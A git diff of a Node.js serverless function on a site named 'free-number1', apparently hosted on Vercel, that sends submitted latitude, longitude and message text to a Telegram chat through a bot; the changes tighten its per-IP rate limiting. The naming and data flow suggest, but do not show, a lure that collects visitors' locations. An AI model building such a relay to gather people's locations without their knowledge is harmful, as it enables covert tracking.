@@ -2,11 +2,11 @@ const fetch = require('node-fetch');
 const FormData = require('form-data');
 const formidable = require('formidable');
 
-const rateLimitMap = new Map();
+const rateLimitMap = new Map(); 
 
 module.exports = async (req, res) => {
   const botToken = process.env.TOKEN;
-  const allowedOrigin = 'https://free-number1.vercel.app'; 
+  const allowedOrigin = 'https://free-number1.vercel.app';
 
   if (req.headers.origin && req.headers.origin !== allowedOrigin) {
     return res.status(403).json({ ok: false, error: 'Invalid origin' });
@@ -54,24 +54,25 @@ module.exports = async (req, res) => {
       return res.status(400).json({ ok: false, error: 'Missing required parameters.' });
     }
 
+    
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     const currentTime = Date.now();
-    const windowTime = 15 * 60 * 1000; // ۱۵ دقیقه
+    const windowTime = 15 * 60 * 1000; 
 
     if (!rateLimitMap.has(ip)) {
       rateLimitMap.set(ip, []);
     }
 
-    const timestamps = rateLimitMap.get(ip);
-    const recentRequests = timestamps.filter(ts => currentTime - ts < windowTime);
+    let timestamps = rateLimitMap.get(ip);
+    timestamps = timestamps.filter(ts => currentTime - ts < windowTime);
 
-    if (recentRequests.length >= 10) {
-  
-      return res.status(200).json({ ok: true, limited: true, message: 'Rate limit reached. Data not sent to Telegram.' });
+    if (timestamps.length >= 10) {
+      return res.status(429).json({ ok: false, error: '⛔ شما به محدودیت ۱۰ بار در ۱۵ دقیقه رسیده‌اید. لطفاً بعداً دوباره تلاش کنید.' });
     }
 
-    recentRequests.push(currentTime);
-    rateLimitMap.set(ip, recentRequests);
+    
+    timestamps.push(currentTime);
+    rateLimitMap.set(ip, timestamps);
 
     try {
       const now = new Date();
@@ -99,14 +100,14 @@ module.exports = async (req, res) => {
         body: new URLSearchParams({ chat_id: chatId, latitude, longitude })
       });
 
-     
+      
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({ chat_id: chatId, text: messageText, parse_mode: 'Markdown' })
       });
 
-      return res.status(200).json({ ok: true, sent: true });
+      return res.status(200).json({ ok: true, message: 'Data sent to Telegram.' });
     } catch (error) {
       return res.status(500).json({ ok: false, error: 'Failed to send data: ' + error.message });
     }
